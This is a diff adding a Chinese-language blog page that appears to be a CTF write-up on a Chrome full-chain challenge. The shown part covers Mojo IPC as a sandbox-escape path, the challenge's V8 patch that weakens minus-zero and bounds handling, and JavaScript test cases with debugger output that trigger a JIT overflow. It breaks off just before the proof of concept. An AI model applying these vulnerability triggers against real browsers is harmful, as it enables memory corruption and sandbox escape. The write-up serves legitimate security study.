@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;237501 0x00 前言最近开始着手研究Chrome沙箱逃逸，正好借着本题学习一下。FullChain的漏洞利用一般需要依靠两个漏洞，首先是通过RCE开启Mojo（一种Chrome用于子进程与父进程进行通信的机制），然后通过Mojo漏洞逃离出沙箱。 0x01 前置知识Mojo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain">
+<meta property="og:url" content="https://github.com/ha1vk/2021/05/20/AntCTFxD3CTF-EasyChromeFullChain/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;237501 0x00 前言最近开始着手研究Chrome沙箱逃逸，正好借着本题学习一下。FullChain的漏洞利用一般需要依靠两个漏洞，首先是通过RCE开启Mojo（一种Chrome用于子进程与父进程进行通信的机制），然后通过Mojo漏洞逃离出沙箱。 0x01 前置知识Mojo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01e34925829dae8783.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0116b6f7c36e11eb13.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01d9aea841f947796a.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01d0cbf22e8ab75746.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01b310cdf5564f51f1.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0115520447550fa34e.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t018551319636bf1e64.png">
+<meta property="article:published_time" content="2021-05-20T06:30:17.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:57:00.215Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="Chrome沙箱逃逸">
+<meta property="article:tag" content="heap spray">
+<meta property="article:tag" content="UAF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p3.ssl.qhimg.com/t01e34925829dae8783.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2021/05/20/AntCTFxD3CTF-EasyChromeFullChain/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2021/05/20/AntCTFxD3CTF-EasyChromeFullChain/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-20 14:30:17" itemprop="dateCreated datePublished" datetime="2021-05-20T14:30:17+08:00">2021-05-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:57:00" itemprop="dateModified" datetime="2025-06-26T17:57:00+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237501">https://www.anquanke.com/post/id/237501</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近开始着手研究Chrome沙箱逃逸，正好借着本题学习一下。FullChain的漏洞利用一般需要依靠两个漏洞，首先是通过RCE开启Mojo（一种Chrome用于子进程与父进程进行通信的机制），然后通过Mojo漏洞逃离出沙箱。</p>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="Mojo"><a href="#Mojo" class="headerlink" title="Mojo"></a>Mojo</h3><p>简单来说，就是一种通信机制，它由两部分组成，首先是C&#x2F;C++层的具体实现部分，这部分的代码会被一起编译进chrome程序中，并且它将运行在chrome的<code>browser进程</code>中(即主进程，没有沙箱的限制)，第二部分就是对外导出的api接口了，在编译好mojom以后，会得到一系列js文件，这些js文件就是对外开放的api库了，我们可以引用它们，从而调用在<code>browser进程</code>中的C&#x2F;C++代码。<br>Mojo不止有js的导出api库，还有java和C&#x2F;C++的导出api库<br><img src="https://p3.ssl.qhimg.com/t01e34925829dae8783.png"><br>在一般的CTF的RealWord题目中，这些mojo的js库一般会部署到远程的web根目录下，仅仅是为了方便，在真实的场景中，这些js一般不会出现，或者出现在一些我们无法预知的路径中，实际上，由于Chrome开源，因此这些库我们都可以直接编译得到一份，然后将其放置在我们远程的服务器上即可<br>要使用mojo的导出api，一般我们需要在js中引用两个库，一个是<code>mojo_bindings.js</code>，提供了一些Mojo操作用的对象和函数，另一个库就是我们想要调用的模块对应的js文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\script type=&quot;text/javascript&quot; src=&quot;/mojo_bindings.js&quot;&gt;&lt;\/script&gt;</span><br><span class="line">&lt;\script type=&quot;text/javascript&quot; src=&quot;/third_party/blink/public/mojom/xxxxx/xxxxx.mojom.js&quot;&gt;&lt;\/script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后，想在代码中使用，只需下列两句话初始化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let xxxxx_ptr = new blink.mojom.xxxxx();</span><br><span class="line">Mojo.bindInterface(blink.mojom.xxxxx.name,mojo.makeRequest(xxxxx_ptr).handle, &quot;process&quot;, true);</span><br></pre></td></tr></table></figure>
+<p>初始化以后，我们就可以使用<code>xxxxx_ptr.</code>的方式来调用<code>browser进程</code>中的C&#x2F;C++函数了。这种方式有点类似于Java中的JNI技术，在语言层仅声明函数，具体实现在底层。不同之处在于<code>mojo</code>的底层代码运行在<code>browser进程</code>,一旦<code>mojo</code>的模块代码实现有漏洞，便可能控制<code>browser进程</code>的程序流，进而完成了沙箱逃逸。</p>
+<h2 id="0x02-V8-RCE部分"><a href="#0x02-V8-RCE部分" class="headerlink" title="0x02 V8 RCE部分"></a>0x02 V8 RCE部分</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span><br><span class="line">index ef56d56e44..0d0091fcd8 100644</span><br><span class="line">--- a/src/compiler/simplified-lowering.cc</span><br><span class="line">+++ b/src/compiler/simplified-lowering.cc</span><br><span class="line">@@ -187,12 +187,12 @@ bool CanOverflowSigned32(const Operator* op, Type left, Type right,</span><br><span class="line">   // We assume the inputs are checked Signed32 (or known statically to be</span><br><span class="line">   // Signed32). Technically, the inputs could also be minus zero, which we treat</span><br><span class="line">   // as 0 for the purpose of this function.</span><br><span class="line">-  if (left.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">-    left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">-  &#125;</span><br><span class="line">-  if (right.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">-    right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">-  &#125;</span><br><span class="line">+  // if (left.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">+  //   left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">+  // &#125;</span><br><span class="line">+  // if (right.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">+  //   right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">+  // &#125;</span><br><span class="line">   left = Type::Intersect(left, Type::Signed32(), type_zone);</span><br><span class="line">   right = Type::Intersect(right, Type::Signed32(), type_zone);</span><br><span class="line">   if (left.IsNone() || right.IsNone()) return false;</span><br><span class="line">@@ -1671,18 +1671,18 @@ class RepresentationSelector &#123;</span><br><span class="line">         VisitBinop&lt;T&gt;(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                       MachineRepresentation::kWord32);</span><br><span class="line">         if (lower&lt;T&gt;()) &#123;</span><br><span class="line">-          if (lowering-&gt;poisoning_level_ ==</span><br><span class="line">-                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">-              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">+          if ((index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                (index_type.Min() &gt;= 0.0 &amp;&amp;</span><br><span class="line">                 index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">             // The bounds check is redundant if we already know that</span><br><span class="line">             // the index is within the bounds of [0.0, length[.</span><br><span class="line">             // TODO(neis): Move this into TypedOptimization?</span><br><span class="line">             new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span class="line">+            DeferReplacement(node, node-&gt;InputAt(0));</span><br><span class="line">+          &#125; else &#123;</span><br><span class="line">+            NodeProperties::ChangeOp(</span><br><span class="line">+               node, simplified()-&gt;CheckedUint32Bounds(feedback, new_flags));</span><br><span class="line">           &#125;</span><br><span class="line">-          NodeProperties::ChangeOp(</span><br><span class="line">-              node, simplified()-&gt;CheckedUint32Bounds(feedback, new_flags));</span><br><span class="line">         &#125;</span><br><span class="line">       &#125; else if (p.flags() &amp; CheckBoundsFlag::kConvertStringAndMinusZero) &#123;</span><br><span class="line">         VisitBinop&lt;T&gt;(node, UseInfo::CheckedTaggedAsArrayIndex(feedback),</span><br></pre></td></tr></table></figure>
+<p>该patch位于<code>CanOverflowSigned32</code>函数，首先确定该函数的调用者，该函数首先在<code>VisitSpeculativeIntegerAdditiveOp</code>中被调用，然后在<code>simplified-lowering</code>阶段执行<code>VisitNode</code>时，遇到<code>kSpeculativeSafeIntegerAdd</code>或者<code>kSpeculativeSafeIntegerSubtract</code>时被调用来处理节点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case IrOpcode::kSpeculativeSafeIntegerAdd:</span><br><span class="line">case IrOpcode::kSpeculativeSafeIntegerSubtract:</span><br><span class="line">  return VisitSpeculativeIntegerAdditiveOp&lt;T&gt;(node, truncation, lowering);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (lower&lt;T&gt;()) &#123;</span><br><span class="line">  if (truncation.IsUsedAsWord32() ||</span><br><span class="line">      !CanOverflowSigned32(node-&gt;op(), left_feedback_type,</span><br><span class="line">                           right_feedback_type, type_cache_,</span><br><span class="line">                           graph_zone())) &#123;</span><br><span class="line">    ChangeToPureOp(node, Int32Op(node));</span><br><span class="line"></span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    ChangeToInt32OverflowOp(node);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了研究<code>CanOverflowSigned32</code>的流程，我们使用如下代码进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function opt(b) &#123;</span><br><span class="line">  var x = b ? 0 : 1;</span><br><span class="line">  var y = b ? 2 : 3;</span><br><span class="line">  var i = x + y;</span><br><span class="line">  return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">   opt(false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>V8.TFBytecodeGraphBuilder</code>阶段，就已经使用了<code>SpeculativeSafeIntegerAdd</code>函数来进行加法运算，到了<code>V8.TFSimplifiedLowering</code>阶段，<code>SpeculativeSafeIntegerAdd</code>被替换成了<code>Int32Add</code>，<br><img src="https://p4.ssl.qhimg.com/t0116b6f7c36e11eb13.png"><br>然而断点<code>CanOverflowSigned32</code>的话，发现未断下，说明该函数未被调用，显然是满足了条件<code>truncation.IsUsedAsWord32</code>，于是我们修改一下测试用例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function opt(b) &#123;</span><br><span class="line">  var x = b ? 1 : -1;</span><br><span class="line">  var y = b ? 2 : -0x80000000;</span><br><span class="line">  var i = x + y;</span><br><span class="line">  return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">   //opt(false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先，我们修改了变量x和y的范围，使得x为<code>Range(-1,1)</code>，y为<code>Range(-0x80000000,2)</code>，那么，对于这种情况，<code>JIT</code>目前还不知道是否可以使用<code>int32</code>的函数来计算，因为它只知道一个Range，如果是计算表达式<code>-0x80000000+1</code>的话，不会溢出，但如果是计算表达式<code>-1+-0x80000000</code>就会<code>int32</code>的范围，发生溢出。因此这种情况下，将会调用<code>CanOverflowSigned32</code>来检查。<br>如果我们不注释掉<code>opt(false);</code>，结果如下<br><img src="https://p4.ssl.qhimg.com/t01d9aea841f947796a.png"><br>这是因为JIT代码生成时收集的信息已经完整，直接使用<code>int64</code>的函数了。也不会去调用<code>CanOverflowSigned32</code>函数。<br>现在知道如何触发<code>CanOverflowSigned32</code>函数以后，我们就可以在该函数下断点，然后进行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/v8/src/compiler/simplified-lowering.cc</span><br><span class="line">   185 bool CanOverflowSigned32(const Operator* op, Type left, Type right,</span><br><span class="line">   186                          TypeCache const* type_cache, Zone* type_zone) &#123;</span><br><span class="line">   187   // We assume the inputs are checked Signed32 (or known statically to be</span><br><span class="line">   188   // Signed32). Technically, the inputs could also be minus zero, which we treat</span><br><span class="line">   189   // as 0 for the purpose of this function.</span><br><span class="line"> ► 190   if (left.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">   191     left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">   192   &#125;</span><br><span class="line">   193   if (right.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">   194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">   195   &#125;</span><br><span class="line">pwndbg&gt; p left.Min()</span><br><span class="line">$2 = -1</span><br><span class="line">pwndbg&gt; p left.Max()</span><br><span class="line">$3 = 1</span><br><span class="line">pwndbg&gt; p right.Min()</span><br><span class="line">$4 = -2147483648</span><br><span class="line">pwndbg&gt; p right.Max()</span><br><span class="line">$5 = 2</span><br></pre></td></tr></table></figure>
+<p>可以知道，这里，<code>left</code>就是<code>x</code>，而<code>right</code>就是<code>y</code>，被patch的这段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">190   if (left.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">191     left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">192   &#125;</span><br><span class="line">193   if (right.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">195   &#125;</span><br></pre></td></tr></table></figure>
+<p>其作用是通过与<code>0</code>进行<code>Union</code>，那么，如果<code>left</code>或者<code>right</code>中存在<code>-0</code>的话，会先转换为<code>0</code>。那么我们来继续分析一下，如果<code>-0</code>不被转换，会存在什么情况？<br>首先，我们修改一下测试用例，添加一个<code>-0</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function opt(b) &#123;</span><br><span class="line">  var x = b ? -1 : -0;</span><br><span class="line">  var y = b ? 2 : -0x80000000;</span><br><span class="line">  var i = x + y;</span><br><span class="line">  return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>主要是下面这里做<code>Intersect</code>时，将出现问题，因为<code>-0</code>不属于<code>Type::Signed32()</code>类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  196   left = Type::Intersect(left, Type::Signed32(), type_zone);</span><br><span class="line">  197   right = Type::Intersect(right, Type::Signed32(), type_zone);</span><br><span class="line">► 198   if (left.IsNone() || right.IsNone()) return false;</span><br></pre></td></tr></table></figure>
+<p>正常情况下，结果是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   193   if (right.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">   194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);</span><br><span class="line">   195   &#125;</span><br><span class="line">   196   left = Type::Intersect(left, Type::Signed32(), type_zone);</span><br><span class="line">   197   right = Type::Intersect(right, Type::Signed32(), type_zone);</span><br><span class="line"> ► 198   if (left.IsNone() || right.IsNone()) return false;</span><br><span class="line">   199   switch (op-&gt;opcode()) &#123;</span><br><span class="line">   200     case IrOpcode::kSpeculativeSafeIntegerAdd:</span><br><span class="line">   201       return (left.Max() + right.Max() &gt; kMaxInt) ||</span><br><span class="line">   202              (left.Min() + right.Min() &lt; kMinInt);</span><br><span class="line">   203 </span><br><span class="line">pwndbg&gt; p left.Min()</span><br><span class="line">$9 = -1</span><br><span class="line">pwndbg&gt; p left.Max()</span><br><span class="line">$10 = 0</span><br></pre></td></tr></table></figure>
+<p>patch以后结果是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p left.Min()</span><br><span class="line">$1 = -1</span><br><span class="line">pwndbg&gt; p left.Max()</span><br><span class="line">$3 = -1</span><br></pre></td></tr></table></figure>
+<p>即<code>-0</code>丢失了,<code>x</code>由<code>Range(-1,-0)</code>变成了<code>Range(-1,-1)</code>，显然，这将导致溢出检测出现问题，我们直接继续修改测试用例，将加法改成减法,那么<code>Range(-1,-1)-Range(-0x80000000,2)</code>显然没有超过<code>int32</code>，于是<code>CanOverflowSigned32</code>返回<code>false</code>，没有检查出溢出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function opt(b) &#123;</span><br><span class="line">  var x = b ? -1 : -0;</span><br><span class="line">  var y = b ? 2 : -0x80000000;</span><br><span class="line">  var i = x - y;</span><br><span class="line">  return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(false));</span><br></pre></td></tr></table></figure>
+<p>虽然输出的值仍然是<code>2147483648</code>，但实际上，cpu溢出标志位已经被设置，因此如果我们使用<code>==</code>与<code>-0x80000000</code>，将返回<code>true</code>，正常情况下是<code>false</code>。于是构造POC如下</p>
